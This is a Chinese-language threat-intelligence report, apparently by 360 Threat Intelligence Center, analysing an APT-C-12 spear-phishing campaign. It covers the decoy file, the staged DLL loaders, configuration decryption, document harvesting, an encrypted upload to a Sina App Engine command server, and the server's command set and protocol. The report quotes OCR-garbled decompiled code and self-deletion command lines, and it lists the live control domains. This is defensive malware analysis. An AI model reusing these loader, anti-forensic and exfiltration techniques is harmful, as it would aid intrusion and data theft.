@@ -1,0 +1,373 @@
+# RESEARCH数据驱动安全  
+
+## 蓝宝菇（APT-C-12）最新攻击样本及C&C机制分析  
+
+2018-07-23By360威胁情报中心|事件追踪  
+
+### 背景  
+
+继360公司披露了蓝宝菇(APT-C-12)攻击组织的相关背景以及更多针对性攻击技术细节后，360威胁情报中心近期又监测到该组织实施的新的攻击活动，本文章是对其相关技术细节的详细分析。  
+
+### 样本分析  
+
+### 诱饵文件  
+
+在APT-C-12组织近期的攻击活动中，其使用了伪装成"中国轻工业联合会投资现况与合作意向简介"的诱导文件，结合该组织过去的攻击手法，该诱饵文会随鱼叉邮件进行投递。  
+
+如下图所示该诱饵文件伪装成文件夹的图标，执行后会打开包含有诱饵文档和图片的文件夹，而此时实际的恶意载荷已经在后台执行。  
+
+  
+
+当该诱饵文件运行时，其会解密释放4个文件，其中两个为上述的诱导文档和图片，另外为两个恶意的tmp文件。  
+
+# 360威胁情报中心  
+
+823 fun_Decryptstr((int)u132，(int)&u108, 44544, 16);// decrypt tmp1   
+824 fun_return3();   
+825 fun_return59();   
+826 fun_return59();   
+827 if （ dword_4E4864 $\angle=$ dword_4E4820)   
+828 L0BYTE(dw0rd_4E3A64) $=$ byte_4E3830;   
+829 else   
+830 dword_4E44Bθ $=$ dword_4E4AC8;   
+831 fun_Decryptstr((int)u124,（int)&u108, 238592,16);// decrpyt tmp2   
+832 fun_return59();   
+833 fun_return3();   
+834 fun_return59();   
+835 if(dword_4E4B88 $>$ dword_4E4320)   
+836 dword_4E3DC4 $=$ dword_4E4564;   
+837 fun_return59();   
+838 fun_return2θ();   
+839 if（dword_4E45Dθ>dword_4E4168   
+840 dword_4E3FDC $=$ dword_4E41B8;   
+841 fun_return59();   
+842 fun_return19();   
+843 fun_Decryptstr((int)u174,(int)&u108, 191450,16);// decrpyt pdf   
+844 if（ dword_4E4C00 $>$ dword_4E4B84)   
+845 dword_4E4126 $=$ dword_4E42Dθ;   
+846 if(dword_4E3E5C $\angle=$ dword_4E406θ)   
+847 BYTE1(dword_4E3C10) $=$ byte_4E3A7A;   
+848 else   
+849 dword_4E46DC $=$ dword_4E4940;   
+850 fun_return59();   
+851 fun_Decryptstr((int)u225, (int)&u108, 344318, 16);// decrypt png  
+
+释放的恶意tmp文件路径为：  
+
+%temp%\unicode32.tmp  
+%appdata%\WinRAR\update.tmp  
+最后通过LoadLibraryW加载释放的unicode32.tmp文件。"._996 U206 $=$ LoadLibraryW(&LibFileName); // load unicode32.tmp  
+
+# unicode32.tmp  
+
+unicode32.tmp为一个loader，其主要用于加载update.tmp，如下图所示其通过rundll32.exe加载update.tmp，并调用其导出函数j。  
+
+# 360威胁情报中心  
+
+597 fun_Decryptstr((int)&u12θ,（int)&u248,5,5);// jj   
+598 strcat(&u119, &u120);   
+599 fun_return3();   
+600 v268 $=$ 100;   
+601 v269 =27;   
+602 $\cup27\varnothing=31$ I   
+603 $\cup271~=~-99$   
+604 $\ U272~=~-89;$   
+605 $\cup273~=~-17$   
+606 $y274=4$   
+607 v275 = -25;   
+608 $\cup276=32$   
+609 v277 = 116;   
+610 $\cup278=126$   
+611 $\yen74;$   
+612 u280 = 0；   
+613 U125 $=$ -14;   
+614 $\cup126~=~-9\Theta$   
+615 U127 = -79;   
+616 v128 $=$ 57;   
+617 U129 $=$ 59;   
+618 v130 $=$ -125;   
+619 v131 $=$ -47;   
+620 v132 $=$ -75;   
+621 v133 $=$ -14;   
+622 U134 $=$ 15;   
+623 V135 $=$ 6；   
+624 v136 $=$ 81;   
+625 v137 $=$ 0;   
+626 fun_Decryptstr((int)&u268,（int)&u125,13,13);// rundl132.exe   
+627 fun_Starporcess((int)&u268,(int)&u119,0,0):   
+628 if（dw0rd_7432B15C>dw0rd_7432B56C   
+629 dword_7432B6Bθ $=$ dw0rd_7432AF80；   
+630 fun_return19();   
+631 fun_return59();   
+632 fun_return19();   
+633 fun_return3();  
+
+当加载了update.tmp后，会删除装载exe程序文件和自身。  
+
+717 fun_Decryptstr((int)&u6,(int)&u178, 39,39);// /c c:& ping 127.0.0.1 -n 3 & del /A   
+718 strcpy(&u119, &u6);   
+719 fun_return59();   
+720 fun_return20();   
+721 if（ dword_7432BDEC $<=$ dword_7432B4A8)   
+722 byte_7432ABF ${\textbf{\textsf{6}}}=$ byte_7432AC16;   
+723 else   
+724 dw0rd_7432B8F0=dw0rd_7432B568;   
+725 strcat(&u119,&u107);   
+726 fun_return59();   
+727 strcat(&u119, &Filename);   
+728 if（dw0rd_7432BF14 $<=$ dword_7432B958）   
+729 byte_7432AE26 $=$ byte_7432AF0E;   
+730 else   
+731 dword_7432B9BC $=$ dword_7432B9FC;   
+732 if（ dword_7432B7BC >dword_7432AF28   
+733 dword_7432BE74 $=$ dword_7432B744;   
+734 strcat(&u119, &u107);   
+735 if （dword_7432B37C $<=$ dword_7432BE04)   
+736 byte_7432AE94 $=$ byte_7432ACF2;   
+737 else   
+738 dw0rd_7432B36C=dw0rd_7432BE00;   
+739 fun_returnar):   
+740 fun Starporcess((int)&u343.（int)&u119. 0）：   
+880 fun_Decryptstr((int)&u281,(int)&u45，62，62);/l /c c:& cd %temp% & del /A unicode32.tmp & taskkill /f /im   
+881 strcpy(&u119, &u281);   
+882 fun_return59();   
+883 fun_return2θ();   
+884 strcat(&u119, &u107);   
+885 fun_return59(）;   
+886 strcat(&u119, 177);   
+887 fun_return59();   
+888 if（dword_7432BD4θ $\zeta=$ dword_7432B430)   
+889 byte_7432ABF5=byte_7432ACA4;   
+890 else   
+891 dvord_7432B048= du0rd_7432B08C;   
+892 strcat(&u119, &u107);   
+893 fun return190):   
+894 fun_Starporcess((int)&u343, (int)&u119, 0, 0);  
+
+# update.tmp  
+
+该文件为一个DLL,并有一个名为j的导出函数。  
+
+  
+
+  
+
+其首先会对目标主机进行信息收集。  
+
+  
+
+  
+获取系统版本信息  
+
+调用CreateToolhelp32Snapshot获取系统进程信息。  
+
+调用GetAdaptersInfo获取网卡MAC地址。  
+
+<html><body><table><tr><td>74033EC9</td><td>FF15 1CC0057 call</td><td>dword ptr ds:[<&IPHLPAPI.GetAdaptersInfo>]</td><td>IPHLPAPI.GetAdaptersInfo</td></tr><tr><td>74633ECF</td><td>85C0 75F</td><td>test eax,eax inz short update.74033EE2</td><td></td></tr><tr><td>74633ED1 74033ED3 74033EDA</td><td>83BE 9001000 744A</td><td>cmp dword ptr ds:[e5i+0x190],0x6 short update.74033F26</td><td></td></tr><tr><td>74633EDC 74033EDE 74033EE0</td><td>8B36 85F6 75 F1</td><td>esi,dword ptr ds:[esi] test esi,esi jnz short update.74033ED3 942A0674 ecx,offset <update.aJwwtw></td><td>UNICODE ALAAC..</td></tr></table></body></html>  
+
+<html><body><table><tr><td>地址 HEX 002225Fθ</td><td>数据</td><td>ASCII</td><td>0012BE6C</td><td>DC255EB3</td></tr><tr><td></td><td>00222600352D433541392D344233372D384332325-C5A9-4B37-8C22</td><td>1...A504A18</td><td>0012BE70 0012BE74 0012BE78</td><td>0012C5Fθ 00000000</td></tr></table></body></html>  
+
+判断当前系统环境是32位或64位。  
+
+# 360威胁情报中心  
+
+  
+
+通过注册表获取已安装的程序信息，获取的安装程序信息加上前缀”ISL”格式化。  
+
+  
+
+<html><body><table><tr><td>ASCII</td><td>0012BDA0.80000002</td><td></td></tr><tr><td>004A737A727C000000 KeyExw..Jszr</td><td></td><td>0012BDA4.θ012BE7θUNIC0DE"S0FTWARE\Micr0Soft\Windows\CurrentUersion\Uninstal1"</td></tr></table></body></html>  
+
+  
+penkeyExW)  
+
+通过注册表获取DisplayName和DisplayVersion的信息， 并将DisplayName 和DisplayVersion格式化为"%s":[“ND":"%s","DV":"%s"}。  
+
+  
+
+信息收集后会首先向远程控制服务器发送上线信息。  
+
+360威胁情报中心  
+
+  
+
+  
+
+获取tmp目录，创建AdobeNW目录,并从控制服务器上下载AdobeUpdate.tmp作为第二阶段的载荷，其实际为一个DLL文件。  
+
+  
+
+  
+
+  
+ds:[71c5c070]=76BD68DA (kerne132.CreateDirectoryA)  
+
+# 360威胁情报中心  
+
+最终调用rundl32启动DLL文件的导出函数MainFun,如果进程创建成功给服务器返回信息。  
+
+162LABEL_26:   
+163 Sleep(0x1388u);   
+164 CommandLine=0;   
+165 memset(&v43， 0, 0xFFu);   
+166 V22=(char\*)ascii_decrypt("rundl132\"%s\",MainFun|");   
+167 sub_10011490（&CommandLine,y22,（unsignedint)&pszBuf);   
+168 memset(&StartupInfo,0,0x44u);   
+169 mm_store_si128((ml28i±）&ProcessInformation,0i64);   
+170 v23=ascii_decrypt("c:\\windows\\system32\\rundl132.exe|");   
+171 y11=1;   
+172 if（CreateProcessA（v23，&CommandLine，0,0,0，0x8oooooou，0，0，&StartupInfo,&ProcessInformation）)   
+173 vi1=2;   
+174 LABEL 28:  
+
+# AdobeUpdate.tmp  
+
+AdobeUpdate.tmp为DLL文件，其导出方法MainFun由第一阶段木马DLL调用执行。  
+
+<html><body><table><tr><td>DllEntry</td><td>1000C320 1</td><td></td><td></td></tr><tr><td></td><td>Dlllnstall</td><td>1000AD40</td><td></td><td></td></tr><tr><td></td><td>DlICanUnload</td><td>1000AE20</td><td></td><td></td></tr><tr><td></td><td>DIIUninstall</td><td>1000AE10</td><td></td><td></td></tr><tr><td></td><td>DllSetClassObject</td><td>1000AA40</td><td></td><td></td></tr><tr><td></td><td>DllUnsetClassObject</td><td>1000ABD0</td><td></td><td></td></tr><tr><td></td><td>DIICopyClassObject</td><td>1000A810</td><td></td><td></td></tr><tr><td></td><td></td><td>100019B0</td><td>7</td><td></td></tr><tr><td>MainFun DllEntryPoint</td><td></td><td>100233C6</td><td>8</td><td></td></tr><tr><td></td><td></td><td></td><td>[main entry]</td><td></td></tr></table></body></html>  
+
+其首先遍历%USERPROFILE%\\AppData路径下tmp后缀文件，并删除。  
+
+# 360威胁情报中心  
+
+／枚举当前进程目录删除目身又件   
+IANDLE _thiscall My_EnumTmp_DeleteFile(const WCHAR \*this)   
+L const WCHAR \*v1; // esi const wchar_t \*v2;// eax   
+HANDLE result; // eax int v4; // ebx HANDLE v5; // esi const wchar_t \*v6; // eax const wchar_t \*v7; // eax   
+const wchar_t \*v8; // eax   
+HANDLE v9; 7/ edi DWORD v10;// esi   
+HANDLE v11; // [esp+Ch] [ebp-C64h]   
+struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-C60h]   
+WCHAR Dst; //[esp+260h][ebp-A10h]   
+WCHAR Src; // [esp+468h] [ebp-808h] v1 = this; GetInputState(); memset(&Dst, 0,0x208u); ExpandEnvironmentStringsW(v1，&Dst, 0x104u); memset(&Src, 0, 0x800u);   
+wccpy_s(&Src, 0x40ou, &Dst);   
+v2 =DeCode(L"\\\*|");   
+Wcscat_s(&Src, 0x400u, v2);   
+result = FindFirstFileW(&Src, &FindFileData); v11 $=$ result;   
+if (result) { V4 = 0; v5 = result; do { memset(&Src, 0, 0x800u); if （v4 && v4 != 1 ) { if （ FindFileData.dwFileAttributes != 16 && ( $N6=$ DeCode(L". |"), wcsstr(FindFileData.cFileName, v6))) { wcscpy_s(&Src, 0x400u, &Dst); Wcscat_s(&Src, 0x400u, L"\\"); Wcscat_s(&Src, Ox400u, FindFileData.cFileName); V7 = Decode(L"-yrul"); //.tmp if ( wcsstr(FindFileData.cFileName, v7) Il (v8 = DeCode(L".YRU|"), wcsstr(FindFileData.cFileName, v8)) ) { v9 = CreateFileW(&Src, 0x80000000, 3u, 0, 3u, Ox80u, 0); v10 = GetFilesize(v9, 0); CloseHandle(v9); if (v10 - 150001 $<=$ 0x1869E) DeleteFileW(&Src); v5 = v11; else wcscpy_s(&Src, 0x400u, &Dst); wcscat_s(&Src, 0x400u, L"\1"); Wcscat_s(&Src, 0x400u, FindFileData.cFileName); My_EnumTmp_DeleteFile(&Src); } } else { ++v4; } while ( FindNextFileW(v5, &FindFileData) ); result = (HANDLE)FindClose(v5);   
+return result;  
+
+然后从文件自身尾部读取配置信息并解密，其格式如下：  
+
+加密的配置信息，包括标识ID，控制服务器地址，加密IV和KEY，以及Mutex信息；  
+
+4字节加密配置信息长度；  
+
+17字节解密密钥；  
+
+<html><body><table><tr><td>6:AE00h:</td><td></td><td></td><td>96B8A6A0</td><td></td><td>A39F</td><td></td><td>9B93</td><td></td><td>9A8EA4A7</td><td></td><td></td><td></td><td>99</td><td></td><td>A998A2</td><td></td><td>1Y>""</td><td></td></tr><tr><td>6:AE10h:</td><td></td><td>A4A4</td><td></td><td>98A5</td><td>A4</td><td>9F</td><td>8E</td><td>AC</td><td>B9</td><td></td><td>9EAD</td><td></td><td>AF</td><td>97</td><td>DA</td><td></td><td>DC</td><td></td></tr><tr><td>6:AE20h:</td><td></td><td>E7A6</td><td>99</td><td>91</td><td>D4</td><td>DE</td><td>DB</td><td>CF</td><td>D2</td><td>CF</td><td>EE</td><td></td><td>EO</td><td>97</td><td>C9</td><td>CB</td><td></td><td>WYY2-12--0U</td></tr><tr><td>6:AE30h:</td><td></td><td>96 BO</td><td>D2</td><td>D3</td><td>C1</td><td>CF</td><td>D8</td><td>C8</td><td></td><td>A6 D5</td><td></td><td>D9</td><td>EA</td><td></td><td></td><td>D5</td><td>D6</td><td>clob01o11a-00</td></tr><tr><td>6:AE40h:</td><td></td><td></td><td>D6</td><td></td><td></td><td></td><td>CC</td><td>CF</td><td></td><td>A6</td><td></td><td></td><td>9A</td><td>DD</td><td>9D</td><td>9D</td><td>8C</td><td>OOAIOEOUY..</td></tr><tr><td>6:AE50h:</td><td>BC</td><td>DD A1</td><td>9B</td><td>C8</td><td>E5</td><td>E4 A4</td><td>BO</td><td>A7</td><td></td><td>97 99</td><td></td><td>A4</td><td></td><td>B2</td><td>BC</td><td></td><td>A3AF</td><td>kyoeaaii1-ng"k</td></tr><tr><td>6:AE60h:</td><td>A5</td><td>B4</td><td>BB</td><td>A4</td><td>A9</td><td>A5</td><td>9B</td><td>9A</td><td></td><td>AC</td><td>91</td><td>AD</td><td>B8</td><td>AC</td><td></td><td>99A7</td><td>8C</td><td>DS-S。μ<！天</td></tr><tr><td>6:AE70h:</td><td>BE A7</td><td>A4</td><td>93</td><td>AO 93</td><td>A4 B5</td><td>A3</td><td>A1</td><td>9C</td><td></td><td>9A AC</td><td>92</td><td>AD B5</td><td>BD AB</td><td>AE</td><td></td><td>A9 96</td><td>AD</td><td>Y>-</td></tr><tr><td>6:AE80h:</td><td>A7</td><td>B3</td><td>97</td><td>9A</td><td>96</td><td>BB</td><td>EO</td><td>D7</td><td></td><td>CE</td><td>D9</td><td>B1</td><td>A9</td><td>9B</td><td></td><td>66</td><td>96 AB</td><td>S""μfceμ<>x-《</td></tr><tr><td>6:AE90h:</td><td>AB</td><td>A6</td><td>99</td><td>A8</td><td>A7</td><td>A3</td><td>AC</td><td>A9</td><td></td><td>9D</td><td>A2AC</td><td></td><td>9A</td><td>AB B7</td><td></td><td>99 9E</td><td>AE</td><td>S3-->ax0+<" 《"5-.-."5Y</td></tr><tr><td>6:AEA0h:</td><td>00</td><td>00</td><td>00</td><td>73</td><td></td><td>6F62</td><td>6373</td><td></td><td></td><td>6E</td><td>6B6369</td><td></td><td></td><td>61</td><td></td><td>A8A7</td><td>9F</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>1747769</td><td>..sobcsnkciatwi</td></tr><tr><td>6:AEB0h:</td><td></td><td></td><td>66666900</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>ffi.</td><td></td></tr></table></body></html>  
+
+例如上图所示的解密配置文件的KEY为sobcsnkciatwiff，其解密算法如下。  
+
+if ( &v107[strlen(v107) + 1] $\underline{{\underline{{\mathsf{I}}}}}=$ &v107[1]] do f v107[v4]-= \*(&Buffer + （v4 & 0xF)):1 ++v4;   
+1 while ( v4 < strlen(v107) );   
+1  
+
+  
+
+解密之后的配置文件如下所示。  
+
+<html><body><table><tr><td>地址</td><td>HEX 数据</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>ASCII</td></tr><tr><td>000BF92C</td><td>23 6t</td><td>3D</td><td>31 303031</td><td>312D</td><td></td><td>3030</td><td>30</td><td>4332 39</td><td>#ID=10011-000C29</td></tr><tr><td>000BF93C</td><td>30 30</td><td>35 37</td><td>4423 6t</td><td>503D</td><td>68</td><td>38</td><td>2E 66</td><td>66 61</td><td>0057DD#IP=98.ffa</td></tr><tr><td>000BF94C</td><td>6B 33</td><td>2E 61</td><td>7θ 70 6C 69</td><td>6E</td><td>7A 69</td><td>2E</td><td>63 6F</td><td>6D 23</td><td>k3.applinzi.com#</td></tr><tr><td>000BF95C</td><td>417070</td><td>4E</td><td>61 6D 65 3D</td><td>66</td><td>66 23</td><td>6t</td><td>6E</td><td>65 72</td><td>AppName=ff#Inter</td></tr><tr><td>000BF96C</td><td>76 61</td><td>6C 3D</td><td>36 30 23 6t</td><td>56</td><td>3D +</td><td>39</td><td>41</td><td>68</td><td>val=60#IV=D9ACC9</td></tr><tr><td>000BF97C</td><td>37 38</td><td>36 30</td><td>37 46 42</td><td></td><td>35 23</td><td></td><td>59</td><td>3D 32</td><td>78607FCBD5#KEY=2</td></tr><tr><td>000BF98C</td><td></td><td>42 37</td><td>9 32 32</td><td>36</td><td>32</td><td></td><td>35 32</td><td>46 37</td><td>D4B7FF22624D52F7</td></tr><tr><td>000BF99C</td><td>32 41</td><td>33 35 t</td><td>31 46 38</td><td></td><td>38 37</td><td>35</td><td>38</td><td>38 23</td><td>2A35D1F8E875E88#</td></tr><tr><td>0OOBF9AC</td><td>4D 75</td><td>7465 78</td><td>3D 30 41</td><td>42</td><td>46</td><td>33</td><td>68 37</td><td>St 39</td><td>Mutex=0ABFA397E9</td></tr><tr><td>BOOBF9BC</td><td>37313639</td><td>42</td><td>39 23 4E</td><td>42</td><td>41</td><td></td><td></td><td></td><td>7169B9#NBA..</td></tr></table></body></html>  
+
+查询HKEY_CURRENT_USER下的MyApp注册表查看是否有FirstExeC，通过字符串"no”来判断该DLL是否是第一次执行。  
+
+  
+
+若DLL不为首次执行，则轮询获取控制服务器命令，否则遍历磁盘C：到F：中的文档文件信息，并保存在temp文件夹下的list_tmp.txt中。  
+
+  
+
+360威胁情报中心  
+
+  
+
+下图为示例的写入数据格式(文件路径创建时间文件大小):  
+
+:\everedit_win32_4379_portable\readme. txt2014-9-21_1KB   
+C:\Program Files\Common Files\SpeechEngines\Microsoft\TTS20\zh-CHS\chs-dsk\M2052DSK. PPT 2011-4-12 401KB   
+C:\Program Files\Fiddler2\credits.txt2017-2-72KB   
+C:\Program Files\VMware\VMware Tools\open_source_licenses.txt2017-11-29 607KB   
+C:\Program Files\VMware\VMware Tools\vmacthlp. txt 2018-3-300KB   
+C:\Program Files\Windows NT\TableTextService\TableTextServiceAmharic.txt2009-6-1016KB   
+C:\Program Files\Windows NT\TableTextService\TableTextServiceArray.txt2009-6-10 1272KB   
+C:\Program Files\Windows NT\TableTextService\TableTextServiceDaYi.txt2009-6-10980KB   
+C:\Program Files\Windows NT\TableTextService\TableTextServiceSimplifiedQuanPin.txt 2009-6-101665KB   
+C:\Program Files\Windows NT\TableTextService\TableTextServiceSimplifiedShuangPin. txt 2009-6-101445KB  
+
+并将list_tmp.txt进行aes加密后上传到控制服务器。  
+
+<html><body><table><tr><td>001EC568 504F 53 001EC578 4F 55 77 001EC588 37 39 39 001EC598 48</td><td>54 20 2F 32 39 30 38 39 38 52 56</td><td>3F 39 30 3D 78 39 2D 4D 26 55 57 52 5F 77</td><td>52 26 43 38 39 75 25 26 46 3D</td><td>2E 48 4F 77 39 36 37 5</td><td></td><td>POST/?90=R&C.H0 0Uw290x9-89u%w49 799898M&UW&F=67T</td></tr><tr><td>001EC5A8 38 37 001EC5B8</td><td>77 32 2θ</td><td>39 30 78 39 48 54 54 5θ</td><td>2D 38 39 2F 31 2E</td><td>39 37 39 3D 55 31 BD</td><td>39 38 39 55 3D 52 BA 63</td><td>HGGGRUR_W4979989 87w290x9-89=UU=R GKJHTTP/1.1..AC</td></tr><tr><td>001EC5C8</td><td>63 65 70 74</td><td>3A 2θ 2A 2F 2A</td><td>D BA 6F</td><td>6E 74 65</td><td></td><td>cept:*/*..Conte</td></tr><tr><td>001EC5D8</td><td>6E 2D 4C</td><td>65 6E 67 74</td><td>68 3A 20</td><td>31 33 33</td><td>48 32</td><td>nt-Length: 13342</td></tr><tr><td>001EC5E8</td><td>34 BA 55</td><td>73 65 72 2D</td><td>41 67 65</td><td>6E 74 3A</td><td>2θ 4D</td><td>4..User-Agent:M</td></tr><tr><td>001EC5F8 6F</td><td>7A 69 6C 6C</td><td>61 2F 35 2E</td><td>30 2θ 28</td><td>57 69</td><td>6E 64</td><td>ozilla/5.θ(Wind</td></tr><tr><td>001EC608 6F</td><td>77 73 2θ 4E</td><td>5 2θ 36 2E</td><td>33 3B 2θ</td><td>57 4F 57</td><td>36</td><td>0WS NT 6.3; W0W6</td></tr><tr><td>001EC618</td><td>3B 2θ 72 76</td><td>32 2E</td><td>30 29 20</td><td>65 63</td><td>6B</td><td>4；ru:42.0) Geck</td></tr><tr><td>001EC628 6F</td><td>2F 32 30 31</td><td>30 30 31 30</td><td>31 2θ 46</td><td>69 72</td><td>65 66</td><td>0/20100101 Firef</td></tr><tr><td>001EC638 6F</td><td>78 2F 34 32</td><td>2E 30 D BA</td><td>43 6F 6E</td><td>74 65</td><td>6E</td><td>0x/42.θ..Content</td></tr><tr><td>001EC648 2D</td><td>54 79 70 65</td><td>3A 2θ 61 70</td><td>70 6C 69</td><td>63 61</td><td>74 69</td><td>-Type: applicati</td></tr><tr><td>001EC658 6F</td><td>6E 2F 6F 63</td><td>74 65 74 2D</td><td>73 74 72</td><td>65 61</td><td>6D GD</td><td>on/octet-stream.</td></tr><tr><td>001EC668 BA</td><td>8 6F 73</td><td>3A 2θ 39 38</td><td>2E 66 66</td><td>61 6B</td><td>33 2E</td><td>.Host: 98.ffak3.</td></tr><tr><td>001EC678 61</td><td>70 70 6C 69</td><td>6E 7A 69 2E</td><td>63 6F 6D</td><td>BD BA</td><td>6F</td><td>applinzi.com..Co</td></tr><tr><td>001EC688 6E</td><td>6E 65 63</td><td>69 6F 6E</td><td>3A 2θ 65</td><td>65 70</td><td>2D Lt</td><td>nnection: Keep-A</td></tr><tr><td>001EC698 6C</td><td>69 76 65 BD</td><td>GA 61</td><td>63 68 65</td><td>2D 43 6F</td><td>6E</td><td>liue..Cache-Cont</td></tr><tr><td>001EC6A8</td><td>72 6F 6C 3A 20</td><td>6E 6F 2D</td><td>63 61 63</td><td>68 65 GD</td><td>GA D</td><td>rol: no-cache</td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table></body></html>  
+
+接着设置注册表FirstExec标志。  
+
+GdiGetBatchLimit();   
+v0=ascii_decrypt（"SOFTWARE\\MyApp|");   
+RegCreateKeyExA(HKEY_cURRENT_USER,vO,O,O,O,OxFO03Fu,O,&phkResult,&dwDisposition）;   
+v1=strlen（ascii_decrypt("no|"));   
+v2 =ascii_decrypt(nol) v3 = ascii decrypt("FirstExec|");   
+RegSetValueExA(phkResult,V3,0,1u,(const BYTE \*）v2，v1）;   
+return RegCloseKey(phkResult);  
+
+AdobeUpdate.dll木马实现了丰富的命令控制指令，其通过访问控制域名获取包含有控制命令的文件，并在本地解密解析后执行。  
+
+# 360威胁情报中心  
+
+  
+
+其指令以\*\*\*和对应指令数字组成，以下为控制指令功能列表。  
+
+<html><body><table><tr><td>***1</td><td>执行cmd命令</td></tr><tr><td>***2</td><td>更新AppName配置</td></tr><tr><td>***3</td><td>文件上传</td></tr><tr><td>***4</td><td>文件下载</td></tr><tr><td>***5</td><td>更新控制域名</td></tr><tr><td>***7</td><td>上传文档文件列表信息</td></tr><tr><td>***8</td><td>执行dll文件或exe</td></tr><tr><td>***9</td><td>文件删除</td></tr><tr><td>***10</td><td>指定文件列表信息上传</td></tr><tr><td>***11</td><td>保留</td></tr></table></body></html>  
+
+### 控制基础设施  
+
+APT-C-12组织近期活动中使用的恶意代码利用了applinzi.com域名下的二级域名作为控制域名，该域名为Sina App Engine的云服务托管。  
+
+  
+360威胁情报中心  
+
+我们测试注册了SAE的账户，其默认创建应用可以免费使用十多天，并支持多种开发语言的环境部署。  
+
+  
+
+  
+
+我们尝试对其控制服务器进行连接，但其后台处理程序已经出错，通过返回的错误信息我们可以发现该组织使用Python部署的后台应用，并使用了flash作为其Web服务实现。  
+
+  
+
+### SAE控制协议  
+
+该组织针对SAE的部署应用实现了一套访问协议，其分为put，info，get，del四个功能。  
+
+其中put用于上传文件：  
+
+  
+
+get用于获取文件：  
+
+# 360威胁情报中心  
+
+  
+
+info用于获取信息：  
+
+  
+
+del用于删除文件：  
+
+360威胁情报中心  
+
+  
+
+## 总结  
+
+继360威胁情报中心发现该组织利用DigitalOcean云服务作为命令控制和回传通信渠道以后，我们又发现该组织使用国内的云服务SAE构建其控制回传基础设施，利用这种方式一定程度上减少了攻击利用的成本，也增加了分析回溯的难度。  
+
+### IOC  
+
+crecg.applinzi.com costbank.applinzi.com  
+
+参考链接https://sae.sina.com.cn/  
+
+APT-C-12蓝宝菇核危机APTNUCLEARCRISIS  
